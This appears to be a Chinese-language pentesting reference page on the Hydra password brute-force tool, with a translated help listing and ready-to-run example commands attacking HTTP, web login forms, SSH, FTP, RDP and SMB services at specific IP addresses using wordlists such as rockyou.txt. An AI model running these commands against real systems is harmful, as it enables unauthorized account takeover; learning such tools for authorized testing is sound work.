---
description: 密码暴力破解工具
---

# Hydra



```shell
hydra -h
  -R 恢复以前中止/崩溃的会话
  -I 忽略现有的还原文件（不要等待 10 秒）
  -S 执行 SSL 连接
  -s PORT 如果服务位于不同的默认端口，请在此处定义
  -l LOGIN 或 -L FILE 使用 LOGIN 名称登录，或从 FILE 加载多个登录
  -p PASS 或 -P FILE 尝试密码 PASS，或从 FILE 加载多个密码
  -x MIN:MAX:CHARSET 密码暴力生成，输入“-x -h”获取帮助
  -y 禁止在暴力破解中使用符号，见上文
  -r 密码生成的雨天模式 (-x)
  -e nsr 尝试“n”空密码，“s”作为通过登录和/或“r”反向登录
  -u 循环用户，而不是密码（有效！隐含在 -x 中）
  -C FILE 冒号分隔的“login:pass”格式，而不是 -L/-P 选项
  -M FILE 要攻击的服务器列表，每行一个条目，':' 指定端口
  -o FILE 将找到的登录名/密码对写入 FILE 而不是 stdout
  -b FORMAT 指定 -o FILE 的格式：text(default), json, jsonv1
  -f / -F 找到登录/密码对时退出（-M：-f 每个主机，-F 全局）
  -t TASKS 运行 TASKS 每个目标的并行连接数（默认值：16）
  -T TASKS 运行 TASKS 整体并行连接（对于 -M，默认值：64）
  -w / -W TIME 响应等待时间 (32) / 每个线程之间的连接 (0)
  -c TIME 在所有线程上每次登录尝试的等待时间（强制 -t 1）
  -4 / -6 使用 IPv4（默认）/ IPv6 地址（总是放在 [] 中也放在 -M 中）
  -v / -V / -d 详细模式 / 每次尝试显示登录+通过 / 调试模式
  -O 使用旧的 SSL v2 和 v3
  -K 不重做失败的尝试（有利于 -M 大规模扫描）
  -q 不打印有关连接错误的消息
  -U 服务模块使用详情
  -m 特定于模块的 OPT 选项，有关信息，请参阅 -U 输出
  -h 更多命令行选项（完整帮助）
  服务器目标：DNS、IP 或 192.168.0.0/24（此或 -M 选项）
  service 要破解的服务（有关支​​持的协议，请参见下文）
  OPT 一些服务模块支持附加输入（-U 为模块帮助）
```

## 命令参数

```shell
# 攻击指定主机的指定端口的服务
hydra -C ./ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

# -L  指定用户名 -P 指定密码
hydra -L ./UserNames.txt -P ./rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

# WEB 表单暴力破解
hydra -C ./ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 
hydra -l admin -P ./rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 
# SSH  攻击
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4

# FTP 攻击
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

# RDP 暴力破解
hydra -L user.list -P password.list rdp://10.129.42.197

# SMB 工具
hydra -L user.list -P password.list smb://10.129.42.197

```
